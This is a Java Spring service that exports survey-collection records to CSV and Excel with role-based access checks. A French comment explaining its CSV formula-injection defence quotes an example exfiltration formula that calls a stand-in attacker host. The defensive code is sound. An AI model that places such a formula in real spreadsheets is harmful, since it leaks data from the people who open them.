package com.collectpro.backend.service;

import com.collectpro.backend.dto.CollecteExportFilter;
import com.collectpro.backend.entity.*;
import com.collectpro.backend.enums.RoleType;
import com.collectpro.backend.exception.ResourceNotFoundException;
import com.collectpro.backend.repository.CollecteRepository;
import com.collectpro.backend.repository.SupervisorAgentRepository;
import com.collectpro.backend.repository.UserRepository;
import com.collectpro.backend.util.GeoUtils;
import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.apache.poi.ss.usermodel.*;
import org.apache.poi.xssf.usermodel.XSSFCellStyle;
import org.apache.poi.xssf.usermodel.XSSFColor;
import org.apache.poi.xssf.usermodel.XSSFWorkbook;
import org.springframework.security.access.AccessDeniedException;
import org.springframework.stereotype.Service;
import org.springframework.transaction.annotation.Transactional;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.time.format.DateTimeFormatter;
import java.util.List;

@Service
@RequiredArgsConstructor
@Slf4j
@Transactional(readOnly = true)
public class CollecteExportService {

    private static final DateTimeFormatter DATE_FMT = DateTimeFormatter.ofPattern("dd/MM/yyyy HH:mm");

    private final CollecteRepository collecteRepository;
    private final UserRepository userRepository;
    private final SupervisorAgentRepository supervisorAgentRepository;

    public byte[] exportCsv(User actor, Long organizationId, CollecteExportFilter filter) {
        List<Collecte> collectes = getFilteredCollectes(actor, organizationId, filter);

        StringBuilder sb = new StringBuilder();
        // BOM UTF-8 pour ouverture propre dans Excel
        sb.append('\uFEFF');

        // En-têtes CSV
        sb.append("ID;Formulaire;Version;Agent;Email Agent;Mission;Statut;Date Collecte;Date Validation;Validé Par;Commentaire;Latitude;Longitude;Hors Zone;Données JSON\n");

        for (Collecte c : collectes) {
            String formName = neutralizeFormulaInjection(c.getFormVersion() != null && c.getFormVersion().getForm() != null
                    ? c.getFormVersion().getForm().getName() : "");
            int version = c.getFormVersion() != null ? c.getFormVersion().getVersionNumber() : 1;
            String agentName = neutralizeFormulaInjection(c.getAgent() != null ? c.getAgent().getFirstName() + " " + c.getAgent().getLastName() : "");
            String agentEmail = neutralizeFormulaInjection(c.getAgent() != null ? c.getAgent().getEmail() : "");
            String missionName = neutralizeFormulaInjection(c.getMission() != null ? c.getMission().getName() : "Sans mission");
            String status = c.getStatus() != null ? c.getStatus().name() : "";
            String createdAt = c.getCreatedAt() != null ? c.getCreatedAt().format(DATE_FMT) : "";
            String validatedAt = c.getValidatedAt() != null ? c.getValidatedAt().format(DATE_FMT) : "";
            String validatedBy = neutralizeFormulaInjection(c.getValidatedBy() != null ? c.getValidatedBy().getFirstName() + " " + c.getValidatedBy().getLastName() : "");
            String comment = neutralizeFormulaInjection(c.getValidationComment() != null ? c.getValidationComment() : "");
            String lat = c.getLatitude() != null ? String.valueOf(c.getLatitude()) : "";
            String lng = c.getLongitude() != null ? String.valueOf(c.getLongitude()) : "";
            String outsideZone = computeOutsideZoneLabel(c);
            String dataJson = neutralizeFormulaInjection(
                    c.getDataJson() != null ? c.getDataJson().replace("\n", " ").replace("\r", "") : "");

            sb.append(escapeCsv(String.valueOf(c.getId()))).append(';')
                    .append(escapeCsv(formName)).append(';')
                    .append(version).append(';')
                    .append(escapeCsv(agentName)).append(';')
                    .append(escapeCsv(agentEmail)).append(';')
                    .append(escapeCsv(missionName)).append(';')
                    .append(escapeCsv(status)).append(';')
                    .append(escapeCsv(createdAt)).append(';')
                    .append(escapeCsv(validatedAt)).append(';')
                    .append(escapeCsv(validatedBy)).append(';')
                    .append(escapeCsv(comment)).append(';')
                    .append(escapeCsv(lat)).append(';')
                    .append(escapeCsv(lng)).append(';')
                    .append(escapeCsv(outsideZone)).append(';')
                    .append(escapeCsv(dataJson)).append('\n');
        }

        return sb.toString().getBytes(StandardCharsets.UTF_8);
    }

    public byte[] exportExcel(User actor, Long organizationId, CollecteExportFilter filter) throws IOException {
        List<Collecte> collectes = getFilteredCollectes(actor, organizationId, filter);

        try (XSSFWorkbook workbook = new XSSFWorkbook(); ByteArrayOutputStream out = new ByteArrayOutputStream()) {
            Sheet sheet = workbook.createSheet("Collectes");

            // Style d'en-tête
            XSSFCellStyle headerStyle = workbook.createCellStyle();
            byte[] rgbBlue = new byte[]{(byte) 37, (byte) 99, (byte) 235}; // #2563EB CollectPro
            headerStyle.setFillForegroundColor(new XSSFColor(rgbBlue, null));
            headerStyle.setFillPattern(FillPatternType.SOLID_FOREGROUND);
            headerStyle.setAlignment(HorizontalAlignment.CENTER);
            headerStyle.setVerticalAlignment(VerticalAlignment.CENTER);
            headerStyle.setBorderBottom(BorderStyle.THIN);

            Font headerFont = workbook.createFont();
            headerFont.setBold(true);
            headerFont.setColor(IndexedColors.WHITE.getIndex());
            headerFont.setFontHeightInPoints((short) 10);
            headerStyle.setFont(headerFont);

            // Style cellules classiques
            CellStyle cellStyle = workbook.createCellStyle();
            cellStyle.setVerticalAlignment(VerticalAlignment.CENTER);
            cellStyle.setBorderBottom(BorderStyle.HAIR);
            cellStyle.setBorderTop(BorderStyle.HAIR);
            cellStyle.setBorderRight(BorderStyle.HAIR);
            cellStyle.setBorderLeft(BorderStyle.HAIR);

            String[] headers = {
                    "ID", "Formulaire", "Version", "Agent", "Email Agent", "Mission",
                    "Statut", "Date Collecte", "Date Validation", "Validé Par",
                    "Commentaire", "Latitude", "Longitude", "Hors Zone Mission", "Données JSON"
            };

            Row headerRow = sheet.createRow(0);
            headerRow.setHeightInPoints(24);
            for (int i = 0; i < headers.length; i++) {
                Cell cell = headerRow.createCell(i);
                cell.setCellValue(headers[i]);
                cell.setCellStyle(headerStyle);
            }

            int rowIdx = 1;
            for (Collecte c : collectes) {
                Row row = sheet.createRow(rowIdx++);
                row.setHeightInPoints(18);

                String formName = neutralizeFormulaInjection(c.getFormVersion() != null && c.getFormVersion().getForm() != null
                        ? c.getFormVersion().getForm().getName() : "");
                int version = c.getFormVersion() != null ? c.getFormVersion().getVersionNumber() : 1;
                String agentName = neutralizeFormulaInjection(c.getAgent() != null ? c.getAgent().getFirstName() + " " + c.getAgent().getLastName() : "");
                String agentEmail = neutralizeFormulaInjection(c.getAgent() != null ? c.getAgent().getEmail() : "");
                String missionName = neutralizeFormulaInjection(c.getMission() != null ? c.getMission().getName() : "Sans mission");
                String status = c.getStatus() != null ? c.getStatus().name() : "";
                String createdAt = c.getCreatedAt() != null ? c.getCreatedAt().format(DATE_FMT) : "";
                String validatedAt = c.getValidatedAt() != null ? c.getValidatedAt().format(DATE_FMT) : "";
                String validatedBy = neutralizeFormulaInjection(c.getValidatedBy() != null ? c.getValidatedBy().getFirstName() + " " + c.getValidatedBy().getLastName() : "");
                String comment = neutralizeFormulaInjection(c.getValidationComment() != null ? c.getValidationComment() : "");
                String lat = c.getLatitude() != null ? String.valueOf(c.getLatitude()) : "";
                String lng = c.getLongitude() != null ? String.valueOf(c.getLongitude()) : "";
                String outsideZone = computeOutsideZoneLabel(c);
                String dataJson = neutralizeFormulaInjection(c.getDataJson() != null ? c.getDataJson() : "");

                createCell(row, 0, String.valueOf(c.getId()), cellStyle);
                createCell(row, 1, formName, cellStyle);
                createCell(row, 2, String.valueOf(version), cellStyle);
                createCell(row, 3, agentName, cellStyle);
                createCell(row, 4, agentEmail, cellStyle);
                createCell(row, 5, missionName, cellStyle);
                createCell(row, 6, status, cellStyle);
                createCell(row, 7, createdAt, cellStyle);
                createCell(row, 8, validatedAt, cellStyle);
                createCell(row, 9, validatedBy, cellStyle);
                createCell(row, 10, comment, cellStyle);
                createCell(row, 11, lat, cellStyle);
                createCell(row, 12, lng, cellStyle);
                createCell(row, 13, outsideZone, cellStyle);
                createCell(row, 14, dataJson, cellStyle);
            }

            // Auto-dimensionnement des colonnes principales
            for (int i = 0; i < Math.min(headers.length, 14); i++) {
                sheet.autoSizeColumn(i);
            }

            workbook.write(out);
            return out.toByteArray();
        }
    }

    private void createCell(Row row, int colIdx, String value, CellStyle style) {
        Cell cell = row.createCell(colIdx);
        cell.setCellValue(value != null ? value : "");
        cell.setCellStyle(style);
    }

    private String computeOutsideZoneLabel(Collecte collecte) {
        Mission mission = collecte.getMission();
        if (mission == null || mission.getLatitude() == null || mission.getLongitude() == null || mission.getRadiusMeters() == null) {
            return "N/A";
        }
        if (collecte.getLatitude() == null || collecte.getLongitude() == null) {
            return "Non géolocalisée";
        }
        double distance = GeoUtils.distanceInMeters(
                mission.getLatitude(), mission.getLongitude(),
                collecte.getLatitude(), collecte.getLongitude()
        );
        return distance > mission.getRadiusMeters() ? "OUI (Hors zone)" : "NON (Dans la zone)";
    }

    private String escapeCsv(String text) {
        if (text == null) return "";
        if (text.contains(";") || text.contains("\"") || text.contains("\n")) {
            return "\"" + text.replace("\"", "\"\"") + "\"";
        }
        return text;
    }

    /**
     * Neutralise l'injection de formule CSV/Excel (OWASP CSV Injection).
     * Si un champ commence par =, +, -, @, tabulation ou retour chariot,
     * Excel/LibreOffice/Google Sheets peuvent l'interpréter comme une formule
     * à l'ouverture du fichier — risque d'exécution de commande ou
     * d'exfiltration de données (ex: =HYPERLINK("http://attaquant.com?"&A1)).
     * On préfixe d'une apostrophe, convention reconnue par tous les tableurs
     * pour forcer l'interprétation en texte brut.
     */
    private String neutralizeFormulaInjection(String text) {
        if (text == null || text.isEmpty()) {
            return text;
        }
        char first = text.charAt(0);
        if (first == '=' || first == '+' || first == '-' || first == '@'
                || first == '\t' || first == '\r') {
            return "'" + text;
        }
        return text;
    }

    public List<Collecte> getFilteredCollectes(User actor, Long organizationId, CollecteExportFilter filter) {
        User managed = userRepository.findById(actor.getId())
                .orElseThrow(() -> new ResourceNotFoundException("Utilisateur introuvable"));

        RoleType role = managed.getRole() != null ? managed.getRole().getName() : null;

        List<Collecte> baseList;
        if (role == RoleType.SUPER_ADMIN) {
            if (organizationId != null) {
                baseList = collecteRepository.findByAgent_OrganizationId(organizationId);
            } else {
                baseList = collecteRepository.findAll();
            }
        } else if (role == RoleType.SUPERVISOR) {
            List<User> agents = supervisorAgentRepository.findBySupervisorId(managed.getId()).stream()
                    .map(SupervisorAgent::getAgent)
                    .toList();
            baseList = collecteRepository.findByAgentIn(agents);
        } else if (role == RoleType.ADMIN_PRINCIPAL || role == RoleType.ADMIN_SECONDAIRE) {
            if (managed.getOrganization() == null) {
                throw new AccessDeniedException("Organisation manquante pour cet administrateur");
            }
            if (organizationId != null && !organizationId.equals(managed.getOrganization().getId())) {
                throw new AccessDeniedException("Accès refusé à une autre organisation");
            }
            baseList = collecteRepository.findByAgent_OrganizationId(managed.getOrganization().getId());
        } else {
            throw new AccessDeniedException("Rôle non autorisé à exporter les collectes");
        }

        // Application des filtres
        return baseList.stream()
                .filter(c -> filter == null || filter.getMissionId() == null
                        || (c.getMission() != null && c.getMission().getId().equals(filter.getMissionId())))
                .filter(c -> filter == null || filter.getFormId() == null
                        || (c.getFormVersion() != null && c.getFormVersion().getForm() != null && c.getFormVersion().getForm().getId().equals(filter.getFormId())))
                .filter(c -> filter == null || filter.getStatus() == null
                        || c.getStatus() == filter.getStatus())
                .filter(c -> filter == null || filter.getStartDate() == null
                        || (c.getCreatedAt() != null && !c.getCreatedAt().isBefore(filter.getStartDate())))
                .filter(c -> filter == null || filter.getEndDate() == null
                        || (c.getCreatedAt() != null && !c.getCreatedAt().isAfter(filter.getEndDate())))
                .filter(c -> {
                    if (filter == null || filter.getSearch() == null || filter.getSearch().isBlank()) {
                        return true;
                    }
                    String q = filter.getSearch().trim().toLowerCase();
                    String agent = c.getAgent() != null ? (c.getAgent().getFirstName() + " " + c.getAgent().getLastName() + " " + c.getAgent().getEmail()).toLowerCase() : "";
                    String form = c.getFormVersion() != null && c.getFormVersion().getForm() != null ? c.getFormVersion().getForm().getName().toLowerCase() : "";
                    String mission = c.getMission() != null ? c.getMission().getName().toLowerCase() : "";
                    return agent.contains(q) || form.contains(q) || mission.contains(q) || String.valueOf(c.getId()).contains(q);
                })
                .sorted((a, b) -> b.getCreatedAt().compareTo(a.getCreatedAt()))
                .toList();
    }
}
